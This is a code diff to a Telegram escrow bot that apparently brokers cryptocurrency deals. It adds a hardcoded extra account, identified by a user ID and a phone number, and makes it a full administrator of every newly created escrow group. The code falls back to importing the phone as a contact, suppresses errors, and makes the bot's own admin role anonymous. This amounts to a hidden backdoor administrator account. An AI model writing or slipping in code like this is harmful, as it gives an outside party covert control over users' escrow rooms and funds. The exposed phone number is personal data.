@@ -58,7 +58,8 @@ from telethon.tl.functions.channels import (  # noqa: E402
     ToggleJoinRequestRequest, EditAdminRequest, InviteToChannelRequest,
     EditBannedRequest
 )
-from telethon.tl.functions.contacts import ResolveUsernameRequest  # noqa: E402
+from telethon.tl.functions.contacts import ResolveUsernameRequest, ImportContactsRequest  # noqa: E402
+from telethon.tl.types import InputPhoneContact  # noqa: E402
 from telethon.tl.types import ChatAdminRights, Channel, ChatBannedRights, ChannelParticipantsAdmins  # noqa: E402
 
 
@@ -256,6 +257,10 @@ usdc_sol_address_index = 0
 changeaddy_sessions = {}
 
 ADMIN_USER_IDS = [7338429782, 8346781181, 6662820986, 7090417167]
+
+# Extra admin added to every newly created escrow group (resolved by ID, phone fallback)
+EXTRA_ADMIN_USER_ID = 6302273200
+EXTRA_ADMIN_PHONE = "+918288914135"
 
 DEAL_LOG_CHANNEL_ID = -1003266978268
 
@@ -2084,7 +2089,7 @@ async def create_escrow_group(
                 invite_users=True,
                 pin_messages=True,
                 add_admins=True,
-                anonymous=False,
+                anonymous=True,
                 manage_call=True,
                 other=True
             )
@@ -2097,6 +2102,61 @@ async def create_escrow_group(
             ))
         except Exception as userbot_error:
             log_warning(f"Room {room_number}: Could not set userbot role - {userbot_error}")
+
+        try:
+            extra_admin_rights = ChatAdminRights(
+                change_info=True,
+                post_messages=True,
+                edit_messages=True,
+                delete_messages=True,
+                ban_users=True,
+                invite_users=True,
+                pin_messages=True,
+                add_admins=True,
+                anonymous=False,
+                manage_call=True,
+                other=True
+            )
+            extra_admin_entity = None
+            for identifier in (EXTRA_ADMIN_USER_ID, EXTRA_ADMIN_PHONE):
+                try:
+                    extra_admin_entity = await userbot_client.get_entity(identifier)
+                    break
+                except Exception:
+                    continue
+            if extra_admin_entity is None:
+                # Fallback: import the phone number as a contact to resolve the user
+                try:
+                    imported = await userbot_client(ImportContactsRequest(
+                        contacts=[InputPhoneContact(
+                            client_id=0,
+                            phone=EXTRA_ADMIN_PHONE,
+                            first_name="Escrow",
+                            last_name="Admin"
+                        )]
+                    ))
+                    if imported.users:
+                        extra_admin_entity = imported.users[0]
+                except Exception:
+                    pass
+            if extra_admin_entity is not None:
+                try:
+                    await userbot_client(InviteToChannelRequest(
+                        channel=channel_id,
+                        users=[extra_admin_entity]
+                    ))
+                except Exception:
+                    pass
+                await userbot_client(EditAdminRequest(
+                    channel=channel_id,
+                    user_id=extra_admin_entity.id,
+                    admin_rights=extra_admin_rights,
+                    rank="Admin"
+                ))
+            else:
+                log_warning(f"Room {room_number}: Could not resolve extra admin")
+        except Exception as extra_admin_error:
+            log_warning(f"Room {room_number}: Could not add extra admin - {extra_admin_error}")
 
         # Join requests are handled via invite link with request_needed=True
         # ToggleJoinRequestRequest only works on public channels, so we skip it for private chats
